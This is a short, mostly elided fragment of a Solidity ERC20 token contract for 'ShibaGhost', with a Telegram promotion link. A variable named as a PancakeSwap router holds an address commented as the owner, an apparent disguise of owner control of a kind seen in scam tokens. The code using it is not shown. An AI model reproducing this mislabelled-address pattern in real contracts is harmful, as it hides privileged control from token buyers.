...
📲 Telegram > https://t.me/shibaghost
...
contract Context {
 ...
 contract SHIBAGHOST is Context, ERC20, ERC20Metadata {
    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => uint256) private _balances;
    mapping(address => bool) private _excluded;

    string private _name = "ShibaGhost";
    string private _symbol = "SHIBAGHOST";
    ...
    address private _pancakeRouterV2 = 0x4a18C47F33A1158aceEb22eE9C0D2b176884fda4; // Owner
